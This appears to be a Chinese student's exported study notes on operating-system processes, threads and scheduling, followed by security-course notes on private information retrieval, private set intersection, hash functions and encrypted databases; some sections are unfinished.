<h3 id="22-process-state"><a class="header" href="#22-process-state">2.2. <a name='ProcessState'></a>Process State：</a></h3>
<p>这些状态具体随操作系统的不同而不同。</p>
<ul>
<li>New：fork()创建一个进程。</li>
<li>Running</li>
<li>Waiting</li>
<li>Ready</li>
<li>Terminate
在Linux中，一个process的parent process如果terminate了，那它就是orphan进程。会被pid=1的进程收养。
如果process terminate了，但是没有被父进程回收，就变成了僵尸进程（zombie process）</li>
</ul>
<h3 id="23-process-control-block"><a class="header" href="#23-process-control-block">2.3. <a name='ProcessControlBlock'></a>Process Control Block</a></h3>
<p>PCB保存很多Process的重要信息，每个进程被一个PCB代表。(好吧，不是这样的。应该说每个线程都有一个PCB，进程是一个虚拟的概念)
PCB有如process state, program counter, CPU reg, CPU-scheduling information, Memory-management information, accounting information, IO status information.</p>
<p>PCB：在Linux中是task_struct结构</p>
<ul>
<li>源代码：https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L629</li>
<li>存储着重要的关于进程的信息</li>
<li>waiting、ready队列会存储PCB以备running</li>
</ul>
<h3 id="24-thread"><a class="header" href="#24-thread">2.4. <a name='Thread'></a>Thread</a></h3>
<p>线程是最小的执行单元。一个进程可以有多个线程，这样在多核CPU中尤其<strong>高效</strong>。并且context switch也更快。</p>
<p>一个Thread特有：thread ID,PC,Stack,Register set：这些构成了<em>thread block</em>。TCB ，在Linux中也用task_struct结构描述。LWP（light weight process）在Linux中就指的是Thread。
但是共享：code section,data section,heap,opend files；也就是说，thread之间的通信比IPC更加高效，但是也更危险。
现代的操作系统中每个process至少有一个thread。我们可以看到one Thread的Thread ID就是Process ID，mutiple Thread的ID</p>
<h3 id="25-process-scheduling"><a class="header" href="#25-process-scheduling">2.5. <a name='ProcessScheduling'></a>Process Scheduling</a></h3>
<p>如果内存不够时，有些进程的内容会被从内存swap out（猜测就是Linux硬盘的swap分区）。
context switch：
比如，维护一个ready,waiting队列
当正在运行的process 需要被切换时，用PCB数据结构保存状态到某个队列，从ready队列中选出一个，从PCB数据结构中载入状态。</p>
<h3 id="process-creation"><a class="header" href="#process-creation">Process Creation</a></h3>
<p>fork(): child 直接复制了所有的parent信息</p>
<p><code>pstree</code>可以查看进程树。
只读空间：有一个特性叫	，可能会把只读空间映射到相同的物理空间</p>
<p>和寄存器</p>
<h3 id="inter-process-communicationipc"><a class="header" href="#inter-process-communicationipc">Inter-Process Communication(IPC)</a></h3>
<p>进程意味着独立。但是进程间也需要交流。
比如pipe,signal, POSIX shared memory, memory message passing</p>
<h3 id="user-thread-vs-kernel-thread"><a class="header" href="#user-thread-vs-kernel-thread">User Thread vs Kernel Thread</a></h3>
<p>多个User Thread对应一个Kernel Thread
并不能享用多核并行</p>
<ul>
<li>GNU Portable Threads</li>
<li>Java Green Thread</li>
</ul>
<p>一个User Thread对应一个Kernel Thread：现在的操作系统（新版本Linux）
一些库：</p>
<ul>
<li>openMP</li>
<li>pthread，这个不是标准库，要自己指定链接</li>
<li>Java Thread</li>
</ul>
<p>fork()的时候,copy 所有的thread?当前的thread?现在的做法是后者。</p>
<p>thread要安全的退出，有async和defer两种办法。https://www.tutorialspoint.com/what-is-thread-cancellation
比如Java中的Thread.stop()是async，未来不支持。</p>
<p>insmod
dmesg   查看kernel log</p>
<h2 id="cpu-scheduling"><a class="header" href="#cpu-scheduling">CPU scheduling</a></h2>
<p>简单的说，决定下面要执行哪个Process/Thread</p>
<ul>
<li>IO-bound</li>
<li>CPU-bound</li>
</ul>
<h3 id="policy"><a class="header" href="#policy">Policy</a></h3>
<h3 id="mechanism"><a class="header" href="#mechanism">Mechanism</a></h3>
<p>非抢占：进程自己决定是否结束。</p>
<p>抢占：CPU决定进程调度。</p>
<p>Ready Queue：所有的ready状态的thread</p>
<p>device queue：contain process waiting for special device</p>
<p>dispatcher</p>
<h2 id="synchronization-1"><a class="header" href="#synchronization-1">Synchronization</a></h2>
<p>Kernel 多线程并行</p>
<pre><code class="language-c">Peterson的Pi:
while (true) {
    flag[i] = true;
    turn = j;
    while (flag[j] &amp;&amp; turn == j);
    /* critical section */
 	//当i的critical在执行的时候，flag[j]一定为false.
    flag[i] = false;
    /*remainder section */
}
</code></pre>
<p>end</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="secure"><a class="header" href="#secure">Secure</a></h1>
<p>大三的一些安全课程的笔记。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="crypto"><a class="header" href="#crypto">Crypto</a></h1>
<p>我<strong>学的很差</strong>，笔记的质量<strong>可想而知</strong>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="federated-learning"><a class="header" href="#federated-learning">Federated Learning</a></h1>
<p>不同的节点想一起训练模型，但是不想互相泄露数据。</p>
<p>如果用安全多方计算，那么效率太低。</p>
<p>联邦学习的思想是，<strong>数据不动模型动</strong>。传输的是模型。不过也有问题，模型也会在一定程度上泄露数据的信息。所以可以对模型进行安全多方计算。</p>
<p>不同节点在本地训练好模型之后，将模型传给中心节点。</p>
<p>https://zhuanlan.zhihu.com/p/83786131</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="oblivious-ram"><a class="header" href="#oblivious-ram">Oblivious RAM</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pir"><a class="header" href="#pir">PIR</a></h1>
<p>Private Information Retrieval (PIR) schemes allow a user to retrieve information from a database while maintaining the privacy of the queries from the database. </p>
<p>一个简化的模型是，Database就是一个n bit的String，用户希望获得第$x_i$个bit，但是Database不知道$x_i$是什么。</p>
<p>Trivial solution: 直接把n bit String都发过来</p>
<h2 id="cgks95"><a class="header" href="#cgks95">CGKS95</a></h2>
<p>假设有两个Server，<strong>他们互相不会串通</strong>。比如，我希望获得String的第i个比特C，那么我构造一个集合<code>S</code>，向两个Server分别发送<code>S</code>和<code>S - {i}</code>，Server将我发来的集合中指定的位异或之后发回给我。我只需要将Server发来的结果进行异或就可以得到我想要的比特C。</p>
<p>$S$的长度应该（约等于）是$|String|/2$。为什么呢？因为我们希望Server猜测i猜对的几率是$1/|String|$。而Server收到我们的S的时候，有$1/2$的几率我们想取的比特在发来的$S$中，所以Server猜中的几率是$1/2|S|$。</p>
<p>所以，通信的代价是$O(n)$</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228210225681.png" alt="image-20211228210225681" /></p>
<p>有一个优化的办法，是使用二维的数据。这时我们发送的两个集合应该（约）满足$|S_1||S_2| = |String|/4$。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228213116497.png" alt="image-20211228213116497" /></p>
<p>还可以继续增加维度，但是Server也需要相应的增加</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228213916426.png" alt="image-20211228213916426" /></p>
<p>然而多个Server的模型不总是现实的。</p>
<h2 id="cg97"><a class="header" href="#cg97">CG97</a></h2>
<p>上面的方法属于 Information-Theoretic PIR，假设Server之间不串通。这种方法属于Computational PIR，需要假设数据库只有多项式算力，不过只需要1个Server了。</p>
<h2 id="ko97"><a class="header" href="#ko97">KO97</a></h2>
<p>采用同态加密的办法。下面黄色的部分是同态加密后的密文，我们假设满足下面两个同态加密的性质
$$
c_1 = Enc(p_1),c_2 = Enc(p_2) \rightarrow 
c_1+c_2 = Enc(p_1+p_2)
\
c = Enc(p_1) \rightarrow
c·p_2 = Enc(p_1·p_2)
$$
那么我们可以采用下面的策略，将加密后的向量发送给Server，Server进行异或运算之后还给我，我再把密文全部异或起来。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228220453383.png" alt="image-20211228220453383" /></p>
<p>一个优化的方法，也是使用二维，通信的代价变成$O(\sqrt n)$</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228221040324.png" alt="image-20211228221040324" /></p>
<h2 id="gentry09"><a class="header" href="#gentry09">Gentry09</a></h2>
<p>利用<strong>全同态加密</strong>Fully homomorphic encryption，我们可以得到一个通信代价更小的协议。</p>
<p>如果我想获得index=5的比特，本来要发送<code>00001000</code>，现在只需要发送<code>101</code>（其实是取反后的<code>010</code>），只需要$O(log(n))$的代价。具体为：</p>
<ol>
<li>
<p>例如，我想要获得第5个比特，我向Server发送$E(1),E(0),E(1)$，$E(x)$代表全同态加密后的结果。</p>
</li>
<li>
<p>Server将我来的加密消息，进行下面乘法操作，这一步的计算代价很高。
$$
a_1=(E(0),E(0),E(1))+(E(0),E(1),E(0)) = (E(0),E(1),E(1))\
a_2=(E(0),E(1),E(0))+(E(0),E(1),E(0)) = (E(0),E(0),E(0))\
a_3=(E(0),E(1),E(1))+(E(0),E(1),E(0)) = (E(0),E(0),E(1))\
a_5=(E(1),E(0),E(1))+(E(0),E(1),E(0)) = (E(1),E(1),E(1))\
...
$$</p>
</li>
<li>
<p>然后再把向量的每一位乘（与）起来，这时只有$a_5=E(1)$，其他都是$E(0)$，再乘上对应的比特。
$$
b_1 = (E(0) \times E(1) \times E(1))\times b_1 =  E(0)\
b_2 = (E(0) \times E(1) \times E(1))\times b_2 =  E(0)\
b_3 = (E(0) \times E(1) \times E(1))\times b_3 =  E(0)\
b_5 = (E(0) \times E(1) \times E(1))\times b_5 =  E(b_5)\
...
$$</p>
</li>
<li>
<p>然后Server再把这些结果加在一起，返回给Client，结果就是$E(b_5)$了。</p>
</li>
</ol>
<p>不难看出虽然通信量减少了，但是计算量大了，所以有了下面的改进方法。</p>
<h2 id="sealpir-acls2017"><a class="header" href="#sealpir-acls2017">SealPIR ACLS2017</a></h2>
<p>仍然是利用全同态的性质。（下面的操作全都是对$x^N+1$取模的）</p>
<p>我们引入一个函数$sub(x,i) = Enc(x^i)$，并且在全同态加密算法中$sub$的代价不大。举例：</p>
<ol>
<li>
<p>例如，我想要获得第5个比特，我向Server发送$sub(x,5) = Enc(x^5)$。</p>
</li>
<li>
<p>Server将我发来的消息，进行下面的操作，这样之后所有的<strong>和i相差为奇数的项</strong>都是负数了。
$$
sub(Enc(x^{5-0}),N+1) = Enc(x^{(N+1)\times(5-0)}) = Enc((-x)^5) = -Enc(x^5)\
sub(Enc(x^{5-1}),N+1) = Enc(x^{(N+1)\times(5-1)}) = Enc((-x)^4) = Enc(x^4) \
sub(Enc(x^{5-2}),N+1) = Enc(x^{(N+1)\times(5-2)}) = Enc((-x)^3) = -Enc(x^3) \
sub(Enc(x^{5-5}),N+1) = Enc(x^{(N+1)\times(5-5)}) = Enc((-x)^0) = Enc(1) \
...\
sub(Enc(x^{5-7}),N+1) = Enc(x^{(N+1)\times(5-7)}) = Enc((-x)^{-2}) = Enc(x^{-2}) \
$$</p>
</li>
<li>
<p>令$f(x) = Enc(x^{5-j}) + sub(Enc(x^{5-j},N+1))$</p>
<p>那么我们就会发现所有<strong>和i相差不是偶数的项</strong>，$f(x)=Enc(0)$，不是奇数的项，为$2Enc(x^{5-j})$。</p>
</li>
<li>
<p><strong>去掉所有0项目</strong>（Server是不知道的，他其实是把所有的项放在一起做，说去掉是为了形象），还剩下
$$
Enc(x^4)\
Enc(x^2)\
Enc(x^0)\
Enc(x^{-2})
$$
将这些项再乘上$x^{1/2}$（准确的说是做$sub(,N/2)$），再重复$sub(,N+1)$的操作和计算$f(x)$的操作，这样<strong>和i相差不是4的倍数</strong>的项，$f(x) = 0$。</p>
</li>
<li>
<p>一直重复，这样和i相差不是2的倍数，不是4的倍数，不是8的倍数...的项都消失了，最后只会剩下正好和i相同的项。需要重复$log(N)$次。</p>
</li>
</ol>
<blockquote>
<p>所以Server最后看到一堆Enc(0)和一个Enc(1)不是就知道哪个是i了吗？</p>
<p>在我们的全同态加密中，一堆Enc(0)是彼此不同的，Server并不能判断出来。</p>
</blockquote>
<h2 id="ppy18"><a class="header" href="#ppy18">PPY18</a></h2>
<p>在Client端存储一些东西。我在Client预存了2+4的内容（2的内容 xor 4的内容）、0+3的内容，1+5的内容。在我还不知道我要什么信息的时候，先取过来。</p>
<p>现在我想要获得0的内容。所以我希望Server给我发送0+2+4的内容，然后我可以通过2+4的内容计算出0的内容。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211229200820061.png" alt="" /></p>
<p>然后我就向Server发送一些消息，让他调整排列顺序，这个过程是不会泄露信息的。让他把0,2,4排列到一行。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211229201014079.png" alt="image-20211229201014079" /></p>
<p>然后我再用PIR请求第三行的内容的和，现在就是请求3个值的PIR了。比请求9个值的PIR通信代价小。</p>
<p>另外要注意的是，2+4使用过一次之后，就要丢弃。</p>
<hr />
<p>https://www.fudata.cn/private-information-retrieval</p>
<p>http://course.ece.cmu.edu/~ece733/lectures/20-pir.pdf</p>
<p>https://eprint.iacr.org/2019/1075.pdf</p>
<p><a href="https://classroom.zju.edu.cn/livingroom?course_id=30687&amp;sub_id=545220&amp;room_id=338&amp;tenant_code=112&amp;sub_public=1">第一节课</a>/<a href="https://classroom.zju.edu.cn/livingroom?course_id=30687&amp;sub_id=535338&amp;room_id=338&amp;tenant_code=112&amp;sub_public=1">第二节课</a></p>
<p><a href="https://eprint.iacr.org/2017/1142.pdf">ACLS2017论文</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="private-set-intersection"><a class="header" href="#private-set-intersection">Private set intersection</a></h1>
<p>隐私集合求交（Private Set Intersection，PSI）是指，参与双方在不泄露任何额外信息的情况下，得到双方持有数据的交集。在这里，额外的信息指的是除了双方的数据交集以外的任何信息。</p>
<p>PSI的安全模型：</p>
<ol>
<li>半可信模型（semi-honest model）：各个参与方诚实的运行安全协议，但对协议中的数据保持好奇，即各方会尝试观察、缓存、推断别人的数据，但是不会破坏协议运行。</li>
<li>恶意模型（malicious model）：各个参与方会恶意的破坏协议运行（包括拒绝参与协议、修改协议执行结果、提前终止协议等）以节省自身的算力或获取其他参与方的数据。</li>
</ol>
<h2 id="基于朴素哈希的方案"><a class="header" href="#基于朴素哈希的方案">基于朴素哈希的方案</a></h2>
<p>A、B双方各自在自己的集合上使用一个商定好的密码学哈希函数$H$计算哈希值，然后A发送给B自己的哈希值，B计算交集。这一协议是简单有效的，但是存在一定安全问题。</p>
<p>当一方的输入域较小（更准确的说法是，密文熵entropy不够大），就存在着另一方使用暴力碰撞攻击的可能。</p>
<h2 id="基于diffie-hellman问题的方案"><a class="header" href="#基于diffie-hellman问题的方案">基于Diffie-Hellman问题的方案</a></h2>
<p>1986年,Meadows[1]提出了基于 Diffie-Hellman问题的 PSI 协议,该协议类似于Diffie-Hellman密钥协商协议。</p>
<p>我们假设双方为Alice和Bob，$x$为Alice拥有的数据之一，$y$为Bob拥有的数据之一。在此协议中，随机数$a$由Alice生成，随机数$b$由Bob方生成，Alice、Bob双方都无法得知对方生成的随机数。$H$是一个哈希操作。</p>
<p>通过下面的方法，Alice就可以知道双方数据的交集。对于Bob来说同理，进行一个相反的操作即可。
$$
Alice \xrightarrow{H(x)^a} Bob
\
Alice \xleftarrow{(H(x)^a)^b,H(y)^b} Bob
\
Alice: x = y \Leftrightarrow (H(x)^a)^b = (H(y)^b)^a
$$
之前介绍的朴素哈希通过暴力碰撞的方法就失效了。因为Bob不会知道Alice的随机数a（除非Diffie Helman被破解了）。它无法加密所有的结果去碰撞。</p>
<p>不难看出，该算法的核心是需要找到一个满足连续两次加密操作（两方先后加密）可以交换顺序的加密算法。</p>
<h2 id="基于rsa的方案"><a class="header" href="#基于rsa的方案">基于RSA的方案</a></h2>
<p>和DH方案是类似的。先回顾一下RSA的基本加密方式，$e$和$d$分别是公钥和私钥，$c$和$m$分别是明文和密文。
$$
c = m^e\ mod\ N \
m = c^d\ mod\ N
$$
我们假设双方为Alice和Bob，$x_i$为Alice拥有的数据之一，$y_j$为Bob拥有的数据之一。Alice为每一个数据生成一个随机数$r_i$，Bob生成公钥私钥对$((N,e),d)$。$H$是一个哈希操作。
$$
Alice \xrightarrow{c = x(r^e)} Bob \
Bob \xrightarrow{c = H(y^d),(x(r^e))^d} Alice \
RSA: (x(r^e))^d = x^dr\
Alice: x=y \Leftrightarrow H(x^d)=H(y^d)
$$</p>
<h2 id="基于oblivious-polynomial-evaluation"><a class="header" href="#基于oblivious-polynomial-evaluation">基于Oblivious Polynomial Evaluation</a></h2>
<p>我们依旧假设双方为Alice和Bob，$x$为Alice拥有的数据之一，$y$为Bob拥有的数据之一。</p>
<ol>
<li>
<p>如果Alice拥有数据$x_1,x_2,...,x_n$，Alice计算多项式P(x)，将系数通过同态加密后发送给Bob
$$
P(x) = (x-x_1)(x-x_2)...(x-x_n) = a_nx^n+...a_1x+a_0\
E(a_0),E(a_1),...E(a_n)
$$</p>
</li>
<li>
<p>Bob拥有数据$y_1,y_2,...,y_n$，为他们每个生成随机数$r_i$，Bob计算下式，发送给Alice。
$$
E(P(y_i)r_i+y_i)
$$</p>
</li>
<li>
<p>对于Alice来说，如果$y=x$，那么Bob发送来的应该就是$E(y)$，所以Alice就可以知道数据的交集了。</p>
</li>
</ol>
<p>对于Unbalance的情况，我们希望数据多（Server）的提供多项式，数据少（Client）的提供数据，Client发送数据（之前是Server发送系数），减小通信量，此时展开（上面的P(x)）就不太好计算量太大，直接计算多项式的话，全同态加密，乘法不能做太多次，所以可以减小乘法</p>
<ol>
<li>Cuckoo Hashing.</li>
<li>把$y^1,y^2...y^n$都算出来发过去，就不用乘法了。</li>
<li><strong>把$y^1,y^2，y^4,y^8,y^{2^n}$都算出来发过去，就只用做很少的乘法了</strong>。这个最好。</li>
</ol>
<hr />
<p>上面介绍的方法效率都比较低。</p>
<h2 id="基于ot"><a class="header" href="#基于ot">基于OT</a></h2>
<p>很高效。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20220109224412592.png" alt="image-20220109224412592" /></p>
<p>一个优化，是去OT 随机数生成的种子。$O(n^2\lambda)$，$\lambda$是位数。</p>
<h2 id="基于安全多方计算"><a class="header" href="#基于安全多方计算">基于安全多方计算</a></h2>
<h2 id="基于tee"><a class="header" href="#基于tee">基于TEE</a></h2>
<hr />
<p><a href="https://classroom.zju.edu.cn/livingroom?course_id=30687&amp;sub_id=535338&amp;room_id=338&amp;tenant_code=112&amp;sub_public=1">第一节课</a>，从21分钟开始。</p>
<p>https://blog.alienx.cn/2020/10/10/E10101535/</p>
<p>一个很好的参考，这是第一部分：https://zhuanlan.zhihu.com/p/396327172</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="crypto-加密和哈希"><a class="header" href="#crypto-加密和哈希">Crypto-加密和哈希</a></h1>
<p>[TOC]</p>
<hr />
<h2 id="常见的哈希算法"><a class="header" href="#常见的哈希算法">常见的哈希算法</a></h2>
<p>Hashcat：https://hashcat.net/hashcat/，不过要安装OpenCl OpenCL:https://www.mql5.com/zh/articles/690#Intel</p>
<h3 id="md5"><a class="header" href="#md5">MD5</a></h3>
<p>MD5破解站：https://cmd5.com/；王小云的论文：https://eprint.iacr.org/2004/199.pdf</p>
<p>MD5消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。这套算法的程序在 RFC 1321 中被加以规范。</p>
<p>2004年，证实MD5算法无法防止<a href="https://zh.wikipedia.org/w/index.php?title=%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB&amp;action=edit&amp;redlink=1">碰撞攻击</a></p>
<p>一个安全的散列算法需要满足如下两个条件，也是散列算法的两个特性。
（1）<strong>抗碰撞性</strong>。根据一个输入，找到一个其它输入得到相同的输出，在计算上是不可行的；
（2）<strong>不可逆性</strong>。根据一个输出，找到一个输入其散列值等于输出，在计算上是不可行的，即不可能从结果逆向推导初始值。</p>
<p>注意，抗碰撞性并不是说散列算法无碰撞，无碰撞的算法不可能是一个散列算法，而只能是一个无损压缩算法，因为散列算法在计算过程中必然会丢失原文部分信息。</p>
<h3 id="sha"><a class="header" href="#sha">SHA</a></h3>
<p>SHA维基百科：https://zh.wikipedia.org/wiki/SHA%E5%AE%B6%E6%97%8F</p>
<p>安全散列算法（英语：Secure Hash Algorithm，缩写为SHA）是一个密码散列函数家族，是FIPS所认证的安全散列算法。能计算出一个数字消息所对应到的，长度固定的字符串（又称消息摘要）的算法。且若输入的消息不同，它们对应到不同字符串的几率很高。</p>
<ul>
<li><strong>SHA-1</strong>：1995年发布，SHA-1在许多安全协议中广为使用，包括<a href="https://zh.wikipedia.org/wiki/TLS">TLS</a>、<a href="https://zh.wikipedia.org/wiki/GnuPG">GnuPG</a>、<a href="https://zh.wikipedia.org/wiki/Secure_Shell">SSH</a>、<a href="https://zh.wikipedia.org/wiki/S/MIME">S/MIME</a>和<a href="https://zh.wikipedia.org/wiki/IPsec">IPsec</a>，是<a href="https://zh.wikipedia.org/wiki/MD5">MD5</a>的后继者。但SHA-1的安全性在2010年以后已经不被大多数的加密场景所接受。2017年荷兰密码学研究小组CWI和Google正式宣布攻破了SHA-1[<a href="https://zh.wikipedia.org/wiki/SHA%E5%AE%B6%E6%97%8F#cite_note-1">1]</a>。SHA1的输出是160bit。
举个例子：</li>
</ul>
<pre><code>$ echo hello | sha1sum 
&gt; f572d396fae9206628714fb2ce00f72e94f2258f  -
</code></pre>
<ul>
<li>
<p><strong>SHA-2</strong>：2001年发布，包括SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256。SHA-2目前没有出现明显的弱点。虽然至今尚未出现对SHA-2有效的攻击，但它的算法跟SHA-1基本上仍然相似。我们平时常见的SHA-256和SHA-512</p>
</li>
<li>
<p><strong>SHA-3</strong>：2015年正式发布，由于对MD5出现成功的破解，以及对SHA-0和SHA-1出现理论上破解的方法，<a href="https://zh.wikipedia.org/wiki/%E5%9C%8B%E5%AE%B6%E6%A8%99%E6%BA%96%E6%9A%A8%E6%8A%80%E8%A1%93%E7%A0%94%E7%A9%B6%E9%99%A2">NIST</a>感觉需要一个与之前算法不同的，可替换的加密散列算法，也就是现在的SHA-3。</p>
</li>
</ul>
<h3 id="hmac"><a class="header" href="#hmac">HMAC</a></h3>
<p><strong>密钥散列消息认证码</strong>（英语：Keyed-hash message authentication code），又称<strong>散列消息认证码</strong>（Hash-based message authentication code，缩写为HMAC），是一种通过特别计算方式之后产生的<a href="https://zh.wikipedia.org/wiki/%E8%A8%8A%E6%81%AF%E9%91%91%E5%88%A5%E7%A2%BC">消息认证码</a>（MAC），使用<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E9%9B%9C%E6%B9%8A%E5%87%BD%E6%95%B8">密码散列函数</a>，同时结合一个加密密钥。它可以用来保证资料的完整性，同时可以用来作某个消息的<a href="https://zh.wikipedia.org/wiki/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">身份验证</a>。</p>
<h3 id="分组密码流密码哈希函数分组密码工作模式"><a class="header" href="#分组密码流密码哈希函数分组密码工作模式">分组密码、流密码、哈希函数、分组密码工作模式</a></h3>
<h3 id="rc4"><a class="header" href="#rc4">RC4</a></h3>
<h2 id="公钥密码"><a class="header" href="#公钥密码">公钥密码</a></h2>
<h3 id="rsa"><a class="header" href="#rsa">RSA</a></h3>
<h3 id="椭圆曲线-ecdlp"><a class="header" href="#椭圆曲线-ecdlp">椭圆曲线 ECDLP</a></h3>
<h3 id="格密码"><a class="header" href="#格密码">格密码</a></h3>
<div style="break-before: page; page-break-before: always;"></div><h1 id="encrypted-database"><a class="header" href="#encrypted-database">Encrypted Database</a></h1>
<ul>
<li>可搜索加密</li>
<li>保序加密</li>
<li>同态加密</li>
<li>SDB/SDB+</li>
</ul>
<h2 id="保序加密-ope"><a class="header" href="#保序加密-ope">保序加密 OPE</a></h2>
<blockquote>
<p>定义：若EE是一个保序加密函数，p1p1和p2p2是两个明文值，并且有密文
$$
c1=E(p1),c2=E(p2)
$$
则有
$$
if(p1&lt;p2)then(c1&lt;c2)
$$</p>
</blockquote>
<p>也就是说加密后的密文保持了和明文一样的顺序。有下面一些算法：</p>
<div class="table-wrapper"><table><thead><tr><th></th><th>Storage (DO)</th><th>Interaction</th><th>Volume (range query)</th><th>Shortage</th></tr></thead><tbody>
<tr><td>BCLO</td><td>O(1)</td><td>O(1)</td><td>O(k)</td><td>Leaking almost the entire first half of plaintexts.</td></tr>
<tr><td>Modular OPE</td><td>O(1)</td><td>O(1)</td><td>O(k)</td><td>Leaking distance between plaintexts.</td></tr>
<tr><td>Mutable OPE</td><td>O(1)</td><td><strong>O(logn)</strong></td><td>O(k)</td><td>O(logn) interaction rounds.</td></tr>
<tr><td>Efficient MOPE</td><td><strong>O(n)</strong></td><td>O(1)</td><td>O(k)</td><td>O(n) storage in DO.</td></tr>
<tr><td>POPE</td><td>O(1)</td><td><strong>O(logn)</strong></td><td><strong>O(k)+O(s)</strong></td><td>Addition interaction for inserted records.</td></tr>
</tbody></table>
</div>
<h3 id="bclo"><a class="header" href="#bclo">BCLO</a></h3>
<p>第一个保序加密算法。目标是</p>
<ol>
<li>Support convenient encryption, decryption, insertion and update. </li>
<li>Require only O(1) storage and one interaction round of DO. </li>
</ol>
<p>理论基础是超几何分布：假设我们有N个球，其中K个是黑球，N-K个白球。我们从中拿n个球，有k个黑球的概率为
$$
f(k;n,K,N) = \frac{C_K^kC_{N-K}^{n-k}}{C^n_N}
$$
假如有明文域$[M]$和密文域$[N]$，$N&gt;M$，从密文域$[N]$中随机抽取$M$个不同的整数组成<strong>有序集合</strong>$S$，构造了一个保序函数$f$：把第$i$个明文$m$映射到第$i$个密文$c$。那么一个保序函数$f$对应唯一的组合$C^M_N$。由此我们可以把构造随机保序函数看做是满足超几何分布的抽球实验。</p>
<p>我们有N个球（密文域大小），中间有M个黑球（明文域大小）。我们随机的从所有球中不放回的抽球，当我们完整的抽完所有球，形成的一种抽球结果序列，按照黑球出现的顺序一一映射，就得到了保序函数f。</p>
<p><img src="Basic/Secure/Crypto/../images/E1911042149-3.png" alt="img" /></p>
<p>以上介绍了BCLO的基本思想，实现是通过不断压缩折半查找实现的。<!-- TODO --></p>
<p>然而这种<strong>简单</strong>的方法存在着隐私泄露的问题。下面m是明文，c是密文，攻击者发现一个密文，他明文几乎肯定落在下面那个概率公式给出的范围内。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228193208396.png" alt="image-20211228193208396" /></p>
<p><strong>BCLO 方案会泄露明文至少一半的比特信息</strong>。并且明文之间的距离也会被泄露。</p>
<h3 id="modular-ope"><a class="header" href="#modular-ope">Modular OPE</a></h3>
<p>为了防止一半比特信息的泄露，我们有Modular OPE。在上面的基础上，让$c'=(c+k)\ mod\ q$。但明文之间的距离还是会被泄露。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228194117654.png" alt="image-20211228194117654" /></p>
<h3 id="mutable-ope"><a class="header" href="#mutable-ope">Mutable OPE</a></h3>
<p>构造了一个OPE Tree，是一种平衡的二叉树。服务器中把数据按照二叉树的形式存储，然后给每个节点一个编号（下面的图是后根顺序遍历的序号）。当新数据插入或数据删除的时候，为了保持树的平衡，需要进行<strong>旋转</strong>操作，节点的序号就随之发生变化了。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211228195410568.png" alt="image-20211228195410568" /></p>
<p>这种方法的安全性高很多，<strong>不会泄露明文的信息</strong>。缺点是复杂度更大了，range query需要$O(log n)$的交互。</p>
<p>数据库中存储的是那个表格内容，label中存储的哈希，让我们可以直接检索12这个值。我们做Range Query的时候，针对的是Encoding进行比较。找到之后返回的是加密的密文<code>AES(key,12)</code>，我们再用密钥解密就好了。</p>
<p>做Range Query的时候，需要Client和Server进行交互。比如我们找比70大的，从Root开始查找，发现22小于70，找35，再找78。就是树的查找过程，代价是$log(n)$。</p>
<h3 id="more-efficient-mope"><a class="header" href="#more-efficient-mope">More efficient MOPE</a></h3>
<p>之前的Mutable OPE需要和Server进行$log(n)$次的交互，所以我们有More Efficient MOPE进行了优化。</p>
<p>在这个模型中，客户端同样存储了这个树的结构。所以这种加密数据库适合<strong>一个明文加密很多次</strong>的情况，否则Client的存储量和Server是一样的。Server有N个数据，但只要n种互不相同的值，Client的存储代价是$O(n)$。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211230182321523.png" alt="image-20211230182321523" /></p>
<h3 id="pope"><a class="header" href="#pope">POPE</a></h3>
<p>插入数据的时候，先插入到根节点，根节点有一个无序数据的缓冲区。</p>
<p>在检索的时候，进行一个重新插入。</p>
<p>这样可以保护新插入的Record的顺序，不过需要一些额外的操作。</p>
<h3 id="adversarial-model"><a class="header" href="#adversarial-model">Adversarial model</a></h3>
<p>如果明文的范围小，而且被全覆盖了。比如年龄，就很容易被还原。把所有密文排好序，然后对号入座就行了。</p>
<p>还可以根据频率、column之间的关系进行攻击。</p>
<h2 id="sdbsdb"><a class="header" href="#sdbsdb">SDB/SDB+</a></h2>
<p>SDB加密方法可以做特别多的运算，他是基于同态加密的。</p>
<ul>
<li>Addition and Multiplication;</li>
<li>Sum, Comparison, join, group-by, etc;</li>
<li>Interoperability.</li>
</ul>
<p>我们有行密钥和列密钥，他们共同得到一个数据的密钥。客户存储所有的行密钥和列密钥。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20211230192217415.png" alt="image-20211230192217415" /></p>
<ul>
<li>加密方法：$c(i,j) = v(i,j)·k(i,j)^{-1} mod\ N$</li>
<li>解密方法：$v(i,j) = c(i,j)·k(i,j)mod\ N$</li>
</ul>
<p>关键是支持一个keyUpdate算法，可以更新列密钥。这样就可以支持很多的操作。</p>
<p>一些Observation</p>
<ul>
<li>SDB can not encrypt 0s;</li>
<li>Ciphertexts for addition and sum are deterministic: E(k, v1) = E(k, v2) iff v1 = v2;</li>
<li>If the ciphertexts E(k1, v1), …, E(kt, vt) have been updated to be under the same key k0, then these ciphertexts can be converted to be under any key within (k0, k1, …, kt)</li>
<li>The Decryption procedure in comparison not only applies to (v1-v2), but also applies to both v1 and v2.</li>
</ul>
